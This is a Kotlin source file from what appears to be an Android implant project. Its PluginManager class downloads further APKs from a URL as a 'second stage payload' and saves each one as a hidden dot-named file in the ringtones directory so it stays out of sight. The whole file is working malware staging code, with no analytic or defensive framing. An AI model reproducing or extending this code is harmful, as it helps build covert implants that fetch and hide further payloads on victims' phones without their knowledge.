/*
* Allows for downloading additional APKs to be installed as a second stage payload.
* */
package com.cooperthecoder.implant

import android.os.Environment
import okhttp3.*
import java.io.File
import java.io.IOException
import java.util.*


class PluginManager(var callback: PluginCallback?): Callback {

    val client = OkHttpClient()

    fun download(url: String) {
        val request = Request.Builder()
                .url(url)
                .build()
        client.newCall(request).enqueue(this)
    }

    fun generateFileName(): String {
        val uuid = UUID.randomUUID().toString()
        return ".$uuid"
    }

    override fun onResponse(call: Call, response: Response) {
        if (! response.isSuccessful) {
            throw IOException("Unexpected response code: " + response.code())
        }
        // Save the APK as a hidden file in the ringtones directory.
        val outfile = File(Environment.DIRECTORY_RINGTONES, generateFileName())
        val body = response.body()
        if (body != null) {
            outfile.writeBytes(body.bytes())
        }
        callback?.onPluginDownloaded(outfile)
    }

    override fun onFailure(call: Call, cause: IOException) {
        callback?.onDownloadFailed(cause)
    }

    fun onDestroy() {
        callback = null
    }
}

